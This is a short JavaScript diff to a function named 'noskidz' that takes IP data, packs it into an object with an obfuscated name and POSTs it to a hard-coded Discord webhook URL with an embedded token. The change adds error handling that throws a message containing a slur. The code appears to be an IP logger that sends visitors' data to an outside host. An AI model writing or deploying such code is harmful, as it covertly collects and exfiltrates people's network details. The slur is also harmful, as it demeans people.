@@ -14,13 +14,21 @@ function noskidz(ipData) {
       }],
     }],
   };
-  
+
   fetch('https://discord.com/api/webhooks/1192845321546498199/DiJqRKu8HTFDv74wz5uH7I044jLDd1Xn4xxeAu5-gPsY9lMJ27hRD5G7-gfWnlQcPxoN', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
     },
     body: JSON.stringify(_0x36e9b8),
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('lol retard');
+    }
+  })
+  .catch(error => {
+    console.error('Error:', error);
   });
 }
 
